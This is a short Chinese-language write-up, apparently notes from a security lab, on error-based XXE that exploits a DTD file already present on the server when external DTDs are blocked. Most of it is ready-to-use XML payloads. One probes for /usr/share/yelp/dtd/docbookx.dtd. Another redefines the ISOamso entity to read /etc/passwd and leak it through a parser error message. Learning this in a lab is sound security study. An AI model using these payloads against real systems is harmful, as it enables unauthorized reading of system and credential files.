# 当服务器不允许，加载外部dtd文件时，可以通过服务器本地的dtd文件来执行xxe

## poc:

```javascript
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

该DTD执行以下步骤：

- 定义一个名为的XML参数实体local_dtd，其中包含服务器文件系统上存在的外部DTD文件的内容。

- 重新定义名为的XML参数实体custom_entity，该参数实体已经在外部DTD文件中定义。该实体被重新定义为包含已描述的基于错误的XXE利用，用于触发包含/etc/passwd文件内容的错误消息。

- 使用local_dtd实体，以便解释外部DTD，包括custom_entity实体的重新定义值。这将导致所需的错误消息。



## 本地dtd文件可以通过以下请求来测试：

```javascript
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```



## 该实验poc:

```javascript
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
//本地dtd文件地址
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

